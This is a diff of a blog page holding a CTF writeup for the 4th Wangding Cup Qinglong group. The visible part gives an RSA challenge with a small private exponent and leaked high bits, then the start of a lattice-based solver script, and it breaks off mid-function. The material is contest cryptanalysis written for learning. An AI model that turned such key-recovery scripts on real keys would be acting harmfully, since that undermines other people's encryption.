@@ -1,455 +1,340 @@
-<!DOCTYPE HTML>
-<html lang="zh-CN">
+<!DOCTYPE html>
+<html>
+	<head>
+		
+<title>第四届“网鼎杯”网络安全大赛青龙组初赛Writeup（最好の一叉树使用者）-</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<link rel="shortcut icon" type="image/x-icon" href="/image/Jeremiah.ico">
 
-
-<head>
-    <meta charset="utf-8">
-    <meta name="keywords" content="第四届“网鼎杯”网络安全大赛青龙组初赛Writeup（最好の一叉树使用者）, CTF, Re, Android, Rust, Go">
-    <meta name="description" content="Crypto
-Crypto01（By Luminoria）
-
-小华刚上班第一天，便发现自己的重要文件被加密，只留下了一段神秘代码，请你结合神秘代码帮助他解密。
-
-从附件得到题目源码
-from Crypto.Util.number impor">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="renderer" content="webkit|ie-stand|ie-comp">
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="format-detection" content="telephone=no">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="referrer" content="no-referrer-when-downgrade">
-    <!-- Global site tag (gtag.js) - Google Analytics -->
-
-
-    <title>第四届“网鼎杯”网络安全大赛青龙组初赛Writeup（最好の一叉树使用者） | J3r3m14h的小屋</title>
-    <link rel="icon" type="image/png" href="/favicon.png">
-    
-
-
-    <!-- bg-cover style     -->
+<link rel="stylesheet" href="/css/index.css">
 
 
 
-<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
-<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
-<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
-<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
-<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
-<link rel="stylesheet" type="text/css" href="/css/matery.css">
-<link rel="stylesheet" type="text/css" href="/css/my.css">
-<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+<meta name="keywords" content="CTF,">
+<meta name="description" content="">
 
 
+<script src="/js/jquery.min.js"></script>
 
 
-    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
-    <link rel="stylesheet" href="/css/post.css">
+<script src="/js/index.js"></script>
 
 
+<script src="/js/fancybox.umd.js"></script>
 
 
-    
+<script src="/js/fancybox-images.js"></script>
 
 
+<script src="/js/gitalk.min.js"></script>
 
-    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 7.3.0">
+<script src="/js/hljs.min.js"></script>
+ 
+<script>hljs.highlightAll();</script>
+
+	<meta name="generator" content="Hexo 7.3.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 </head>
 
-
-<body>
-    <header class="navbar-fixed">
-    <nav id="headNav" class="bg-color nav-transparent">
-        <div id="navContainer" class="nav-wrapper container">
-            <div class="brand-logo">
-                <a href="/" class="waves-effect waves-light">
-                    
-                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
-                    
-                    <span class="logo-span">J3r3m14h的小屋</span>
-                </a>
-            </div>
-            
-
-<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
-<ul class="right nav-menu">
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/" class="waves-effect waves-light">
-      
-      <i class="fas fa-home" style="zoom: 0.6;"></i>
-      
-      <span>首页</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/archives" class="waves-effect waves-light">
-      
-      <i class="fas fa-archive" style="zoom: 0.6;"></i>
-      
-      <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/friends" class="waves-effect waves-light">
-      
-      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
-      
-      <span>友情链接</span>
-    </a>
-    
-  </li>
-  
-  <li>
-    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
-      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
-    </a>
-  </li>
-  <li>
-    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
-      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
-    </a>
-  </li>
-</ul>
-
-
-<div id="mobile-nav" class="side-nav sidenav">
-
-    <div class="mobile-head bg-color">
-        
-        <img src="/medias/logo.png" class="logo-img circle responsive-img">
-        
-        <div class="logo-name">J3r3m14h的小屋</div>
-        <div class="logo-desc">
-            
-            CTFer Re方向 记录一下学习笔记和知识点捏
-            
-        </div>
+	<body>
+		
+	<div class="header">
+		<div class="header-top" id="header-top">
+			<div class="h-left">
+				<a href="/">
+					<img src="/image/logo.png" alt="Quiet">
+				</a>
+			</div>
+			<div class="h-right">
+				<ul>
+					
+						
+								<li>
+									<a href="/">
+										HOME
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/archives">
+										ARCHIVE
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/categories">
+										CATEGORIES
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/tags">
+										TAGS
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/links">
+										LINKS
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/about">
+										ABOUT
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+				</ul>
+			</div>
+			<div class="h-right-close">
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
+					<path fill="none" d="M0 0h24v24H0z" />
+					<path d="M3 4h18v2H3V4zm0 7h18v2H3v-2zm0 7h18v2H3v-2z" fill="rgba(68,68,68,1)" />
+				</svg>
+			</div>
+		</div>
+	</div>
+	<div class="sidebar">
+    <div class="topo">
+        <h2>Jeremiah</h2>
     </div>
-
-    <ul class="menu-list mobile-menu-list">
+    <ul>
         
-        <li class="m-nav-item">
-	  
-		<a href="/" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-home"></i>
-			
-			首页
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/archives" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-archive"></i>
-			
-			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/friends" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-address-book"></i>
-			
-			友情链接
-		</a>
-          
-        </li>
-        
-        
-        <li><div class="divider"></div></li>
         <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
-                <i class="fab fa-github-square fa-fw"></i>Fork Me
-            </a>
+            <a href="/">HOME</a>
+        </li>
+        
+        <li>
+            <a href="/archives">ARCHIVE</a>
+        </li>
+        
+        <li>
+            <a href="/categories">CATEGORIES</a>
+        </li>
+        
+        <li>
+            <a href="/tags">TAGS</a>
+        </li>
+        
+        <li>
+            <a href="/links">LINKS</a>
+        </li>
+        
+        <li>
+            <a href="/about">ABOUT</a>
         </li>
         
     </ul>
-</div>
-
-
-        </div>
-
+    <div class="my_foot">
         
-            <style>
-    .nav-transparent .github-corner {
-        display: none !important;
-    }
-
-    .github-corner {
-        position: absolute;
-        z-index: 10;
-        top: 0;
+        <a target="_blank" rel="noopener" href="https://github.com/79E/hexo-theme-quiet">
+            <img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
+        </a>
+        
+    </div>
+</div>
+<div class='shelter'>
+</div>
+<style>
+    .shelter{
+        background-color: #333;
+        opacity:0.5;
+        cursor: pointer;
+        display: none; 
+        position: fixed;
+        left: 0;
+        top: 0; 
         right: 0;
-        border: 0;
-        transform: scale(1.1);
+        bottom: 0;
+        z-index: 1998;
+    }
+    .sidebar {
+        width: 66%;
+        height: 100%;
+        position: fixed;
+        top: 0;
+        right: -100%;
+        bottom: 0;
+        background: #fff;
+        z-index: 1999;
+        text-align: center;
+        box-shadow: -6px 0 20px rgba(98, 94, 94, .815);
     }
 
-    .github-corner svg {
-        color: #0f9d58;
-        fill: #fff;
-        height: 64px;
-        width: 64px;
+    .topo {
+        width: 100%;
+        height: 200px;
+        background: url(https://api.ixiaowai.cn/gqapi/gqapi.php) no-repeat;
+        background-size: 100% 100%;
+        position: relative;
+        display: flex;
+        align-items: flex-end
     }
 
-    .github-corner:hover .octo-arm {
-        animation: a 0.56s ease-in-out;
+    .topo h2 {
+        color: #fff;
+        z-index: 1;
+        position: relative;
+        margin: 0 0 10px 10px;
+        font-size: 1.2em;
+        box-sizing: border-box
     }
 
-    .github-corner .octo-arm {
-        animation: none;
+    .topo:before {
+        content: '';
+        background-image: url(/image/pattern.png);
+        background-repeat: repeat;
+        height: 100%;
+        left: 0;
+        position: absolute;
+        top: 0;
+        width: 100%;
+        z-index: 1
     }
 
-    @keyframes a {
-        0%,
-        to {
-            transform: rotate(0);
-        }
-        20%,
-        60% {
-            transform: rotate(-25deg);
-        }
-        40%,
-        80% {
-            transform: rotate(10deg);
-        }
+    .sidebar ul {
+        width: 100%;
+        margin-top: 50px
+    }
+
+    .sidebar ul li {
+        height: 50px;
+        list-style: none;
+        font-size: 1.2em;
+        text-align: right;
+        margin-right: 10px
+    }
+
+    .sidebar ul li a {
+        display: grid;
+        color: #5d606a;
+        text-overflow: ellipsis;
+        width: 100%;
+        text-decoration: none
+    }
+
+    .my_foot {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 10px;
+        position: absolute;
+        bottom: 0
+    }
+
+    .my_foot a {
+        text-decoration: none;
+        margin-right: 10px;
+        display: inline-block
+    }
+
+    .my_foot a img {
+        width: 30px;
+        height: 30px
     }
 </style>
 
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
-   data-tooltip="Fork Me" data-position="left" data-delay="50">
-    <svg viewBox="0 0 250 250" aria-hidden="true">
-        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
-        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
-              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
-        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
-              fill="currentColor" class="octo-body"></path>
-    </svg>
-</a>
+<script>
+    $( function () {
+	$( '.h-right-close>svg' )
+		.click( function () {
+			$( '.sidebar' )
+				.animate( {
+					right: "0"
+				}, 500 );
+			$( '.shelter' )
+				.fadeIn( "slow" )
+		} );
+	$( '.shelter' )
+		.click( function ( e ) {
+			$( '.sidebar' )
+				.animate( {
+					right: "-100%"
+				}, 500 );
+			$( '.shelter' )
+				.fadeOut( "slow" )
+		} )
+} )
+
+</script>
+
+<div class="post">
+    <div class="post-header-background post-header-img"
+    style="background: url('https://api.ixiaowai.cn/gqapi/gqapi.php')" 
+>
+    <div class="post-header-background-content">
+        <ul class="post-header-tag">
+            
+            
+            <li><a href="/tags/CTF">CTF</a></li>
+            
+            
+        </ul>
         
-    </nav>
-
-</header>
-
-    
-
-
-
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
-    <div class="container" style="right: 0px;left: 0px;">
-        <div class="row">
-            <div class="col s12 m12 l12">
-                <div class="brand">
-                    <h1 class="description center-align post-title">第四届“网鼎杯”网络安全大赛青龙组初赛Writeup（最好の一叉树使用者）</h1>
+        <h1>第四届“网鼎杯”网络安全大赛青龙组初赛Writeup（最好の一叉树使用者）</h1>
+        <div class="post-header-info">
+            <div class="post-header-info-author">
+                
+                    <svg t="1604839279282" class="icon" viewBox="0 0 1024 1024" version="1.1"
+                        xmlns="http://www.w3.org/2000/svg" p-id="2901" width="20" height="20">
+                        <path
+                            d="M513 956.3c-247.7 0-448-200.3-448-448S265.3 66.2 513 66.2s448 200.3 448 448-200.3 442.1-448 442.1z m0-830.9c-212.2 0-388.8 170.7-388.8 388.8C124.2 726.3 294.9 903 513 903c212.2 0 388.8-170.7 388.8-388.8S725.2 125.4 513 125.4z m0 430.2c-94.2 0-170.7-76.5-170.7-170.7S418.8 207.8 513 207.8s170.7 76.5 170.7 170.7S607.2 555.6 513 555.6z m0-289.1c-64.6 0-112 52.8-112 112s47.4 117.9 112 117.9 112-52.8 112-112-47.4-117.9-112-117.9z m0 689.8c-135.7 0-259-58.7-341.9-158.9l-11.8-17.8 11.8-17.8c76.5-117.9 206.2-188.5 347.8-188.5 135.7 0 265 64.6 341.9 182.6l11.8 17.8-11.8 17.8C778 897.1 648.7 956.3 513 956.3zM230.3 773.2C300.9 849.7 406.9 897 513 897c112 0 218.1-47.4 288.6-129.8-70.5-88.2-170.7-135.6-282.7-135.6s-218.1 53.3-288.6 141.6z"
+                            p-id="2902" fill="#ffffff"></path>
+                    </svg>
+                    
+                <span class="post-header-info-author-text"> <a href="../../about">Jeremiah</a></span>
+                <div class="post-header-info-author-categories">
+                    
+                         <a href="../../categories/Re-Crypto-Web-Pwn-Misc/" target="_blank" >Re Crypto Web Pwn Misc</a>
+                    
                 </div>
+                <p>2024-11-03 12:42:19</p>
             </div>
         </div>
     </div>
 </div>
-
-
-
-
-<main class="post-container content">
-
+    <div class="post-content" id="content">
+  
+  <div id="article" class="post-content-info">
     
-    <div class="row">
-    <div id="main-content" class="col s12 m12 l9">
-        <!-- 文章内容详情 -->
-<div id="artDetail">
-    <div class="card">
-        <div class="card-content article-info">
-            <div class="row tag-cate">
-                <div class="col s7">
-                    
-                    <div class="article-tag">
-                        
-                            <a href="/tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
-                            </a>
-                        
-                    </div>
-                    
-                </div>
-                <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/Re-Crypto-Web-Pwn-Misc/" class="post-category">
-                                Re Crypto Web Pwn Misc
-                            </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
 
-            <div class="post-info">
-                
-                <div class="post-date info-break-policy">
-                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2024-11-03
-                </div>
-                
-
-                
-                <div class="post-date info-break-policy">
-                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-11-03
-                </div>
-                
-
-                
-                <div class="info-break-policy">
-                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.5k
-                </div>
-                
-
-                
-
-                
-                    <div id="busuanzi_container_page_pv" class="info-break-policy">
-                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
-                        <span id="busuanzi_value_page_pv"></span>
-                    </div>
-				
-            </div>
-        </div>
-        <hr class="clearfix">
-
-        
-        <!-- 是否加载使用自带的 prismjs. -->
-        <link rel="stylesheet" href="/libs/prism/prism.min.css">
-        
-
-        
-
-        <div class="card-content article-card-content">
-            <div id="articleContent">
-                <h1>Crypto</h1>
+    <h1>Crypto</h1>
 <h2 id="Crypto01（By-Luminoria）">Crypto01（By Luminoria）</h2>
 <blockquote>
 <p>小华刚上班第一天，便发现自己的重要文件被加密，只留下了一段神秘代码，请你结合神秘代码帮助他解密。</p>
 </blockquote>
 <p>从附件得到题目源码</p>
-<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">d = getPrime(<span class="number">299</span>)</span><br><span class="line">e = inverse(d,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">hint1 = p &gt;&gt; (<span class="number">512</span>-<span class="number">70</span>)</span><br><span class="line">hint2 = q &gt;&gt; (<span class="number">512</span>-<span class="number">70</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"n = <span class="subst">{n}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"e = <span class="subst">{e}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"c = <span class="subst">{c}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"hint1 = <span class="subst">{hint1}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"hint2 = <span class="subst">{hint2}</span>"</span>)</span><br><span class="line"></span><br><span class="line">n = <span class="number">114118679597315994458138232536029700477506764789782067073905766324635160145597602207164997807103187990046901850125798774503781767630201814025142189432534890147340404293319424524872695905368897290630698362559606549134377263394129199145835483978820237203114250882524438599220793209608842281879976692805855046971</span></span><br><span class="line">e = <span class="number">60930873636939710528141652371287627298970658591028170597199994159301433213017349592910581153194811053524011559886529831760967700162629319952838130973563991607758850226327915934518549584588693854388996425152821459866209334446088324204759334980239670811977086959854952233887459542997456604453766160444477603017</span></span><br><span class="line">c = <span class="number">11058775585296329544235824126670578486484201903851563493984057289075513008773878014007377223222464555346135675900619903617528838701118612201290486747980233570288315027654510774940371032813981282018787668864123759554297515664915358447425647424759926416629451915378248520432568536260902676664298855076689608823</span></span><br><span class="line">hint1 = <span class="number">884675140903190287932</span></span><br><span class="line">hint2 = <span class="number">1000130673738973880482</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p * q<br>d = getPrime(<span class="hljs-number">299</span>)<br>e = inverse(d,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(m,e,n)<br>hint1 = p &gt;&gt; (<span class="hljs-number">512</span>-<span class="hljs-number">70</span>)<br>hint2 = q &gt;&gt; (<span class="hljs-number">512</span>-<span class="hljs-number">70</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f"n = <span class="hljs-subst">{n}</span>"</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f"e = <span class="hljs-subst">{e}</span>"</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f"c = <span class="hljs-subst">{c}</span>"</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f"hint1 = <span class="hljs-subst">{hint1}</span>"</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f"hint2 = <span class="hljs-subst">{hint2}</span>"</span>)<br><br>n = <span class="hljs-number">114118679597315994458138232536029700477506764789782067073905766324635160145597602207164997807103187990046901850125798774503781767630201814025142189432534890147340404293319424524872695905368897290630698362559606549134377263394129199145835483978820237203114250882524438599220793209608842281879976692805855046971</span><br>e = <span class="hljs-number">60930873636939710528141652371287627298970658591028170597199994159301433213017349592910581153194811053524011559886529831760967700162629319952838130973563991607758850226327915934518549584588693854388996425152821459866209334446088324204759334980239670811977086959854952233887459542997456604453766160444477603017</span><br>c = <span class="hljs-number">11058775585296329544235824126670578486484201903851563493984057289075513008773878014007377223222464555346135675900619903617528838701118612201290486747980233570288315027654510774940371032813981282018787668864123759554297515664915358447425647424759926416629451915378248520432568536260902676664298855076689608823</span><br>hint1 = <span class="hljs-number">884675140903190287932</span><br>hint2 = <span class="hljs-number">1000130673738973880482</span><br><br></code></pre></td></tr></tbody></table></figure>
 <p>根据检索，发现是RSA高位爆破题目，并且在2023江苏省领航杯有对应的题目，而且非常凑巧的是师傅写了个傻瓜脚本</p>
 <blockquote>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mumuhhh/p/17789591.html#bd">https://www.cnblogs.com/mumuhhh/p/17789591.html#bd</a></p>
 </blockquote>
-<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">time.clock = time.time</span><br><span class="line"> </span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># 如果晶格达到该尺寸，则停止移除</span></span><br><span class="line"><span class="comment"># 显示有用矢量的统计数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (nothelpful, <span class="string">"/"</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">" vectors are not helpful"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示带有 0 和 X 的矩阵</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_overview</span>(<span class="params">BB, bound</span>):</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">'%02d '</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">'0'</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">'X'</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>: </span><br><span class="line">                a += <span class="string">' '</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">'~'</span></span><br><span class="line">        <span class="comment">#print (a)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试删除无用的向量</span></span><br><span class="line"><span class="comment"># 从当前 = n-1（最后一个向量）开始</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span><br><span class="line">    <span class="comment"># 我们从当前 = n-1（最后一个向量）开始</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 开始从后面检查</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment">#  如果它没有用</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">             <span class="comment"># 让我们检查它是否影响其他向量</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># 如果另一个向量受到影响：</span></span><br><span class="line">                <span class="comment"># 我们增加计数</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 等级：0</span></span><br><span class="line">            <span class="comment"># 如果没有其他载体最终受到影响</span></span><br><span class="line">            <span class="comment"># 我们删除它</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="comment">#print ("* removing unhelpful vector", ii)</span></span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line">           <span class="comment"># 等级：1</span></span><br><span class="line">            <span class="comment">#如果只有一个受到影响，我们会检查</span></span><br><span class="line">            <span class="comment"># 如果它正在影响别的向量</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># 如果它影响哪怕一个向量</span></span><br><span class="line">                    <span class="comment"># 我们放弃这个</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># 如果没有其他向量受到影响，则将其删除，并且</span></span><br><span class="line">                <span class="comment"># 这个有用的向量不够有用</span></span><br><span class="line">                <span class="comment">#与我们无用的相比</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="comment">#print ("* removing unhelpful vectors", ii, "and", affected_vector_index)</span></span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, 